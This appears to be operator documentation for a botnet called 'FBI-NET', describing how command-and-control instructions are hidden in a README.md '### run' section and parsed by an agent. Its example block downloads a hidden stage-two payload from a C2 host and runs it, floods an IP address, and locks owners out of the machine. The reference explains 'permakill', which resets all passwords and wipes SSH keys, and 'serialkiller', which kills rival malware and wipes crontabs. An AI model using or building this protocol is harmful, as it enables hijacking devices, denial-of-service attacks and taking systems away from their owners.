# FBI-NET Command Protocol

## `### run` Format

Commands can be embedded in README.md using the `### run` section format:

```markdown
### run
cmd whoami
download http://c2.example.com/stage2 /tmp/.sshd RUN HIDE
dos 192.168.1.1 60
permakill root newpassword
serialkiller RUN
selfkill
```

Each line is parsed as a command. Lines starting with `#` or `//` are comments.

## Command Reference

### `permakill <username> <password>`
Credential lockdown: changes all user passwords, locks root, wipes SSH keys,
disables telnetd. Generated via `Permakill::generate_full_lockout()`.

### `serialkiller [RUN]`
Competitor malware removal. Kills 50+ known malware processes via killall/pkill,
blocks 13 common malware ports via iptables. With `RUN` flag: also wipes
user crontabs and /tmp directories. Generated via `SerialKiller::generate_kill_commands()`.

### `selfkill`
Immediately terminates the agent process. No cleanup.

## Implementation

Parsed by `arcticfox-core/src/fbi.rs:parse_run_section()`.
Executed by `arcticfox-agent/src/executor.rs` (permakill, serialkiller).
Agent also supports direct command strings via the command queue.
